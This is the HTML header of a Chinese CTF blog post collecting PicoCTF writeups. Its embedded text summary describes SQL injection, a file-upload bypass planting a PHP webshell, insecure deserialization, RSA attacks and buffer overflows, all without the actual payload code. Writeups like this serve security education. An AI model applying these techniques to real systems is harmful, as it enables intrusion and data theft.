<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>All-in-One PicoCTF Writeups | CX330</title><meta name="keywords" content="PicoCTF,資安"><meta name="author" content="CX330"><meta name="copyright" content="CX330"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="All-in-One PicoCTF Writeups"><meta name="application-name" content="All-in-One PicoCTF Writeups"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="All-in-One PicoCTF Writeups"><meta property="og:url" content="https://cx330.tw/posts/4f98706e/index.html"><meta property="og:site_name" content="CX330"><meta property="og:description" content="前言 其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。 自己在刷 PicoCTF 的時候常常發現，幾乎所有的 writeup 都是英文的居多，所以想說來寫個完整一點的中文版！總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題"><meta property="og:locale" content="en"><meta property="og:image" content="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png"><meta property="article:author" content="CX330"><meta property="article:tag" content="CX330, 陳子雋, CX330 universe, CX330 Blog, Blog, CTF, CX330 hacker, hacker, 資安, 駭客, 黑客, 程式設計, 程式設計師, 程式設計博客, 程式設計部落格, 程式設計日誌, 程式設計師日誌, 程式設計部落格日誌"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png"><meta name="description" content="前言 其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。 自己在刷 PicoCTF 的時候常常發現，幾乎所有的 writeup 都是英文的居多，所以想說來寫個完整一點的中文版！總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題"><link rel="shortcut icon" href="/assets/favicon.ico"><link rel="canonical" href="https://cx330.tw/posts/4f98706e/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-PM5RRNPNEB"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-PM5RRNPNEB');
</script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"CX330","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: undefined,
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: 'https://comments.cx330.tw/',
  commentBarrageConfig:{"enable":true,"maxBarrage":1,"barrageTime":8000,"accessToken":"8e5a0f02d2d6b6604e700a856bf586e7","mailMd5":"25de757f9696b310771b584e7bf5b238"},
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: {"mode":"api","api":"https://img2color.cx330.tw/api?img=","cover_change":true},
  authorStatus: {"skills":["Hacker","CTFer","Developer","Programmer",1337]},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"轉為繁體","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: CX330","link":"Link: ","source":"Source: CX330","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'CX330',
  title: 'All-in-One PicoCTF Writeups',
  postAI: '',
  pageFillDescription: '前言, Web, unminify, picobrowser, SQLiLite, More SQLi, Trickster, Super Serial, Java Code Analysis!?!, Crypto, Easy1, Caesar, New Caesar, rotation, Mind your Ps and Qs, No padding no problem, interencdec, Easy peasy, Custom encryption, Mini RSA, miniRSA, b00tl3gRSA2, b00tl3gRSA3, Pwn (Binary Exploitation), Local Target, buffer overflow 0, buffer overflow 1, Forensics, MSB, Reverse, GDB Test Drive, Misc (General Skills), binhexa前言其實好像也沒什麼好講前言的但就是不想要一開始就是題目分類所以還是放了個前言自己在刷的時候常常發現幾乎所有的都是英文的居多所以想說來寫個完整一點的中文版總之呢這裡就是會盡量彙整所有的的題目在這邊但是因為已經寫了題左右才開始打算來寫所以可能前面的部分會等其他都寫完再來補如果有需要就可以直接來這邊看所有的就這樣啦希望能幫忙到你先看題目點開後他會說如果你打開了這個網頁代表你的瀏覽器已經收到了只是他不知道要怎麼讀取它既然他說了我們瀏覽器已經收到了就打開看一下網頁代碼吧點開開發者工具後直接在的裡面用搜尋字串結果就直接找到了欸不是這題也太水了吧這題我們點進後會看到一個的按鈕按下去會發現我們不能得到他說我們應該要是所以我就寫了一個的腳本來運行看看能不能拿到這裡把改為這樣就得到了題目是一個登入頁面我們先嘗試用登入看看它會說但是我們可以看到它的查詢語句是所以我們就可以很輕鬆的用啦這邊使用帳號登入就可以啦密碼不用輸入或是隨便輸入也行但是他說在裡面所以我們看不見那就打開開發者工具用搜尋吧把題目了之後會進入到一個登入頁面如下圖然後我們先嘗試使用作為帳號密碼登入帳號密碼都輸入後按下登入網頁會渲染一個我們剛剛輸入的帳號密碼以及後台的使用者資訊的查詢語句如下圖片有點小總之他顯示的內容就是像下面這樣所以我們在這邊把密碼用這串作為輸入帳號可以隨便輸入整個的就會變成這樣可以從上面的代碼高亮的顏色發現在後面的東西都被註解掉了所以就可以直接登入系統啦登入後會看到以下的介面他可以查詢的名稱但其實一筆資料包含了分析一下後台可能的語句應該是如下再來因為題目有告訴我們系統使用的是所以會有一個叫做的表來儲存一些表格的各種資訊資訊來源知道這些候我們輸入讓整個語句變成如下這邊我們使用聯集合併兩個查詢結果因為第一個結果為空集合所以返回的結果就會是的表格內容如下我們可以看到被紅色框框圈住的地方就是我們所想獲得的既然知道表格名稱也知道表格的結構了就把它查詢出來吧使用這段輸入後就可以看到以下的介面啦就找到囉這題的題目是一個可以上傳的網頁看起來就是文件上船漏洞頁面如下秉持著不知道要幹嘛的時候先掃路徑的精神可以找到它的它其中禁止了兩個路徑如下既然它都禁止了我們就去看看吧應該就是它的上船後的文件路徑了而它的內容如下所以我們知道後端驗證檔案是否為的方法有二其一為檢查文件後綴名是否為其二為驗證文件的看文件在十六進制中的前幾個位元組是否為知道了這些信息後我們先隨便找一張圖片上傳看看吧我這邊直接隨便截圖並命名為並且在的過程中用去攔截封包並修改其中的檔案名稱及檔案內容這邊把檔案名稱改為並在檔案內容的以下添加這個一句話木馬整個修改完後如下點開來看可能會比較清楚上傳完成後現在這個就會位於這個位置上啦接下來再用中國蟻劍這款工具去連接那個就可以啦連接過程如下連接完成後就可以直接看一下網站的文件看到以下這個應該就是了於是我們就成功找到了啦如下這邊補充一個知識點來講一下到底是在做啥但因為我也不是很熟所以我們來看看大神是怎麼回答的吧當然這段代碼的原理是允許遠程執行伺服器上的代碼這是如何工作的是代碼的開始標記中的函數執行傳遞給它的字符串作為代碼這裡的代碼來自於請求中名為的變量符號用來抑制任何錯誤信息這樣用戶不會看到執行過程中產生的任何錯誤由於這段代碼執行任意代碼它使得伺服器容易受到攻擊因此屬於一種非常危險的做法簡言之任何通過變量傳送的代碼都將被伺服器執行這可以用於各種目的包括但不限於數據讀取文件操作等然後我後來找到了另一篇它的比較酷是一個即時執行的框有興趣可以去看一下這篇這題先讀取發現它有一個禁止的路徑為這似乎代表著它有支持文件所以可以到裡面看它的源代碼為題目說在中所以解題的思路就是要想辦法讀取到先把圖片上的程式碼拿出來分析一下這裡用到了這裡重定向到由於可以透過查看原始代碼所以先去查看和可以發現在中有以下漏洞這裡的反序列化是不安全的題目名稱也有提示是和有關如果反序列化失敗進入到裡面就會把輸出在裡面的這個類中他定義了就是讀取並回傳的內容所以我們只要建立一個的並輸入錯誤的值就可以觸發反序列化的錯誤下圖中我設置了的值為成功觸發反序列化錯誤的訊息接著我們用來線上寫一些的程式碼這邊會這樣寫是因為我們從中可以看到原始碼是先再最後才反序列化所以整個流程就是反過來就對了他這邊輸出了我們把的值修改為這個試試看能不能正確的輸出成功再來我們只需要一個的並且把他的設定為就可以了如下上面這個代碼執行後會得到這個就是我們最終的啦把它貼到的的並重新整理頁面試試看吧這題稍微大一點是一個電子書系統一開始他給了一個登入介面還有一組帳密帳號密碼除此之外也有給源代碼我們先來看看網頁的樣子登入後會看到更多的功能包括閱讀書籍查詢書籍查看帳戶等等登入後的介面如下題目告訴我們這題的是要讀取到的書籍就可以獲得了但是向上圖所看到的我們現在是而這本書只有可以閱讀所以要來想辦法提升權限密碼學任督二脈這題是一個維吉尼亞密碼維吉尼亞密碼法語又譯維熱納爾密碼是使用一系列凱撒密碼組成密碼字母表的加密算法屬於多表密碼的一種簡單形式維基百科解密的方式也很簡單最上面一列是明文最左邊那行是這樣對應起來中間的字元就是密文知道了這個之後回推回去就可以得到明文獲取密鑰字母的偏移量獲取密文當中目前的字母用偏移量進行解密而最後的如下如同題目所說這題就是個基本的凱薩加密題目給了加密過的就把裡面那串拿去解密因為不知道偏移量是多少所以就暴力破解跑出來的結果中看起來是最合理所以這就是了題目給了一個密文和一個腳本先觀察這個加密腳本發現他是把明文每個字母的值轉為後從左邊補補到個然後每位元分為一塊每塊的二進制數字映射到的字符集再把這個東西拿去做就是凱薩加密的變形總之解密的話就是反著來就不詳細解釋了如下暴力破解後看起來最像的就是這個了最後自己幫它包上提交果然是正確的這題給了一個加密後的密文看起來就是直接拿去網路上那種凱薩密碼暴力破解這邊使用這題是個加密先來複習一下加密裡面的流程和參數複習完後看一下題目的說明這題的敘述中告訴我們當太小的時候我們可以使用小公鑰指數攻擊而題目要我們思考當太小的時候我們可以如何利用回去看一下加密的流程後我們發現是兩個質數的乘積而當太小的時候我們就可以暴力破解出兩個跟這裡我們直接使用去找的因數就可以找到和了而有了和我們就可以順著流程找到明文了我寫了個幫我找出明文如下最後找到的明文會是一個很大的數字這時候再用的並將其轉為字符串就可以得到了可以先看過這篇離散數學同餘是什麼當我們把題目給的密文拿去解密他會說代表題目的這支程式應該是在偵測我們輸入的是否為而我們知道所以我們利用題目給的和相加後輸入到他的程式會得到接著只要再利用的方法就可以找到明文如下題目給了密文如下因為他最後面的兩個讓他看起來很像是的格式所以就用先一下這邊用的是這款工具他可以線上進行很多種的編碼解碼加密等等解碼一次後長這樣還是很像的格式所以我又做了一次解碼注意這邊要把前面的拿掉只留引號中的內容再解碼一次後變成了這樣的形狀看起來已經有的雛型了因為大括號所以猜測它是某種置換密碼就用最普遍的凱薩密碼來暴力解解看吧如下想了解可以去看看這個一次性密碼本先看題目在這題中我們要先閱讀他給我們的在函式中我們可以看到一些事情因為題目給的的長度為又因為他是以十六進制的方式輸出所以我們可以知道他用掉的長度為也就是說我們下次在加密的時候是用第位開始的這裡從開始知道了我們第一次輸入要加密的銘文是從第個開始後我們要想辦法可以使用到跟題目一樣的那組而在程式碼的這個區段我們可以發現一些事在這邊如果我們讓和相等讓的話就會被設定為所以我們就可以讓被重複使用了所以我們先輸入一堆沒用的字元去填充那個區間段讓他把第一個循環結束再進入一次循環後我們就可以得到跟題目一樣的了然後因為他加密的方法是用計算的方式所以我們可以簡單地透過再計算一次得到明文如下這題給了兩個檔案一個是加密後的裡面還包含了加密需要的一些變量另一個是加密腳本既然給了腳本那就先來看看吧我結合了題目給的加密後的的資訊把註解直接寫在了代碼裡面看看吧密文明文的每個字元碼密鑰並到一個從明文的末尾開始循環裡面每個字元對應的密文明文密鑰由上面的代碼可以知道它是經過了兩次的加密一次是把明文反過來並讓其對循環做第二次是把第一次加密得到的東西轉並乘以再乘以解密的話就反過來先去除以再除以這裡為得到一個半密文接下來這個半密文要先反轉再用它寫好的去做因為它的裡面又有一次反轉所以這樣剛好會是和加密時相同的順序最後得到的這個明文還要再反轉一次才會得到正確的至於為甚麼要反轉兩次解釋如下假設題目的為明文為加密解密第一次反轉把變為所以在裡就會計算對的第二次反轉把轉為希望這樣解釋有比較清楚一點總之照這樣解密就可以得到啦以下是我的解密的代碼使用返回將密文反轉題目給了一組加密的密文還有公鑰如下不難發現這題的公鑰指數超小只有所以我們使用小公鑰指數攻擊由於題目有說略大於故其解題原理如下為密文為明文是公鑰指數是公鑰模數為了計算明文我寫了一個腳本如下宣告題目所給的暴力破解的次方根數字轉字串執行後就可以找到啦這題的原理和上面那題一模一樣都是太小所以用小公鑰指數攻擊想知道更詳細原理看上面那題這邊直接上宣告題目所給的暴力破解的次方根數字轉字串這題給了一個連接方式先連進去主機看看吧連進去後可以得到公鑰跟密文在題目的描述中他說意思是在這題裡面他把和互換了用來加密下面這篇文章有詳細說了為甚麼不應該使用這種做法簡而言之當私鑰指數比較小的時候可以使用這邊可以使用一個開源工具來幫助我們快速執行攻擊使用方式請查看官方文檔總之如下總之就是把參數都設定好就可以成功得到了這題和上一題一樣先用連線到主機得到資訊如下題目說了意思是這題的初始質數不只有和所以我們只要找到歐拉函數並且正常走流程就可以了由於他不只有和兩個質數分解起來會容易很多如下返回一個字典為質因數為該質因數的冪宣告題目給的資訊這邊的是用到了以下的求歐拉函數的公式這樣求出來後就可以用正常計算流程找到明文了這題給了一個可執行的檔案和語言的代碼先來分析一下他的代碼吧當使用連線到題目的時候會如同下面一般分析代碼宣告了一個長度為的字元陣列儲存使用者輸入獲取使用者輸入由於函數不檢查輸入的長度使用者可以輸入超過個字元危险函数几种完美的替代方法你可能还不知道的宣告並初始化變數拿到的條件是要讓的值為這邊我們可以用指令進入的手冊頁看一下他的區塊了解到底危險在哪裡攻擊首先先檢查一下他有沒有任何保護機制他沒有也沒有就正常做就可以了因為和都是區域變數所以會存在中並且因為是先宣告緊接著宣告所以在中會像下面這樣最後試出來的是個字元加上一個大寫的因為但是在這裡我有點不理解為甚麼前面是個填充猜測是跟中間有之類的東西如果有人知道的話再麻煩跟我解釋一下感謝了總之還是拿到啦這題也是給了可執行文件和源代碼先下載下來看看這裡會出這裡是關鍵函數的名稱代表著當運行時出現時會調用函數分析代碼是要觸發函式裡面的宣告為個字元的大小也就是個當輸入的內容超過個的時候觸發錯誤這邊我們可以再來看一下除了以外的危險函式也就是手冊裡面也寫了程式設計師要負起責任指派一個足夠大的空間給的攻擊所以我們知道在這裡只要輸入很長的字串就會造成出錯並得到那就來試試看吧老樣子一個檔案一個源碼看這個題目名稱然後又出現在應該是跟隱寫術有關了如果你還不知道和都是個啥可以先去看看密碼學任督二脈裡面有解釋了甚麼是和題目的題幹說那相反的它其實就是在暗示可能藏在像素值的中所以就來提取它每個像素中的的吧這邊用到了中的這個庫如果覺得太麻煩也可以直接用這個現成的工具如下獲取圖片尺寸初始化儲存提取自的字串提取每個像素的運算只保留了的最高位後面清零再右移位將提取的每個位元轉換成字元替換為你的路徑這題的話先用把題目這個二進制檔案抓下來然後後面的步驟基本上就照著題目給的指令一步一步來就可以了這邊來稍微解釋一下每個指令的意義他到底是做了哪些事情呢修改檔案的權限新增執行權限使用打開這個可執行檔案啟用組合語言視圖在函數開始偏移的位元組的地方設置斷點跳到函數開始偏移位元組的地方繼續執行至於這邊為甚麼要在的地方設定斷點是因為這裡他調用了一個函式叫做所以當我們直接執行的時候會進入到的狀態讓我們以為這個程式沒有做任何事所以在這邊我們才要把斷點設在讓他執行到這邊的時候暫停一下然後我們直接使用叫到下面一個地方也就是繼續執行這樣就得到啦這題比較簡單就是一些基礎的和最後把轉為就行了它主要有六題的邏輯運算和一題我是直接使用提供的進行連接然後用這個線上工具運算題目如下這樣就得到啦',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-12 20:56:02',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="cx330" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="CX330" type="application/atom+xml">
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加載頭像" src="/assets/me.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.min.css"/><script async="async" src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">CX330</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> Articles</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-list-ul faa-tada" style="font-size: 0.9em;"></i><span> Archives</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> Categories</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> Tags</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-dice faa-tada" style="font-size: 0.9em;"></i><span> Random</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> Social</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> Link exchange</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-message faa-tada" style="font-size: 0.9em;"></i><span> Message board</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> My</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=12295857597&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> Music bar</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> Life snippets</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/collect/"><i class="anzhiyufont anzhiyu-icon-book faa-tada" style="font-size: 0.9em;"></i><span> Collections</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> Photos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> About</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> Whoami</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/subscribe/"><i class="anzhiyufont anzhiyu-icon-rss faa-tada" style="font-size: 0.9em;"></i><span> Subscribe</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="Discover a random post" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="Search🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> Search</span></a></div><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://buymeacoffee.com/cx330" target="_blank"><img class="post-qr-code-img" alt="Buy Me a Coffee" src="/assets/buymeacoffee.png"/></a><div class="post-qr-code-desc">Buy Me a Coffee</div></li><li class="reward-item"><a href="https://cx330.tw" target="_blank"><img class="post-qr-code-img" alt="CX330" src="/assets/me.jpg"/></a><div class="post-qr-code-desc">CX330</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互動</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">音樂</div><span class="author-content-item-title">靈魂的碰撞💥</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">July 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">13</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">June 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>Post(s)</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="顯示模式切換" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="邊欄顯示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="熱評開關"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音樂開關"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切換"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">Original</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/PicoCTF/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>PicoCTF</span></a><a class="article-meta__tags" href="/tags/%E8%B3%87%E5%AE%89/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont 